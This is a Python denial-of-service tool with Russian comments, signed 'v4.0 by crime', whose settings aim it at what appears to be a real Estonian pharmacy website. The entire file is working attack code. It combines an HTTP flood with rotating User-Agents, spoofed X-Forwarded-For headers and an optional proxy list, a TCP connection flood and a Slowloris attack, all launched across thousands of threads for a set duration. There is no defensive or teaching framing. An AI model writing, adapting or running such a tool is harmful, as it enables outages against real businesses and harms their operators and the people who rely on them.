import socket
import random
import threading
import time
import urllib.request
from datetime import datetime

# ===== НАСТРОЙКИ ===== #
TARGET_URL = "https://www.euroapteek.ee"  # 🔧 Замени на цель
THREADS = 10000                     # 💀 Количество потоков
ATTACK_DURATION = 300              # ⏱️ Длительность атаки (сек)
USE_PROXIES = False                # 🌐 Использовать прокси (True/False)
# ==================== #

# Список User-Agents для обхода защиты
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

# Список прокси (если USE_PROXIES = True)
PROXIES = [
    "103.154.230.87:3128",
    "45.95.147.106:8080"
]

# ===== АТАКИ ===== #
def http_flood():
    while True:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            }
            req = urllib.request.Request(TARGET_URL, headers=headers)
            if USE_PROXIES:
                proxy = random.choice(PROXIES)
                req.set_proxy(proxy, "http")
            urllib.request.urlopen(req, timeout=5)
            print(f"[HTTP] Sent request to {TARGET_URL}")
        except:
            pass

def tcp_flood():
    target_ip = socket.gethostbyname(TARGET_URL.split("//")[-1].split("/")[0])
    target_port = 80
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET / HTTP/1.1\r\nHost: " + target_ip + "\r\n\r\n").encode(), (target_ip, target_port))
            s.close()
            print(f"[TCP] Sent packet to {target_ip}:{target_port}")
        except:
            pass

def slowloris():
    target_ip = socket.gethostbyname(TARGET_URL.split("//")[-1].split("/")[0])
    sockets = []
    for _ in range(200):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, 80))
            s.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n".encode())
            s.send("User-Agent: Mozilla/5.0\r\n".encode())
            sockets.append(s)
        except:
            pass
    while True:
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1, 9999)}\r\n".encode())
            except:
                pass
        time.sleep(15)

# ===== ЗАПУСК ===== #
print(f"""
▓█████▄  ▒█████   ███▄ ▄███▓ ██▓███   ██▓     ▒█████   ██▀███  
▒██▀ ██▌▒██▒  ██▒▓██▒▀█▀ ██▒▓██░  ██▒▓██▒    ▒██▒  ██▒▓██ ▒ ██▒
░██   █▌▒██░  ██▒▓██    ▓██░▓██░ ██▓▒▒██░    ▒██░  ██▒▓██ ░▄█ ▒
░▓█▄   ▌▒██   ██░▒██    ▒██ ▒██▄█▓▒ ▒▒██░    ▒██   ██░▒██▀▀█▄  
░▒████▓ ░ ████▓▒░▒██▒   ░██▒▒██▒ ░  ░░██████▒░ ████▓▒░░██▓ ▒██▒
 ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░   ░  ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
 ░ ▒  ▒   ░ ▒ ▒░ ░  ░      ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░▒ ░ ▒░
 ░ ░  ░ ░ ░ ░ ▒  ░      ░   ░░         ░ ░   ░ ░ ░ ▒    ░░   ░ 
   ░        ░ ░         ░                ░  ░    ░ ░     ░     
 ░                                                     v4.0 by crime
Target: {TARGET_URL}
Threads: {THREADS}
Time: {ATTACK_DURATION} sec
""")

# Запуск атак
for _ in range(THREADS):
    threading.Thread(target=http_flood, daemon=True).start()
    threading.Thread(target=tcp_flood, daemon=True).start()
    threading.Thread(target=slowloris, daemon=True).start()

# Таймер
time.sleep(ATTACK_DURATION)
print("\n[!] Attack finished.")
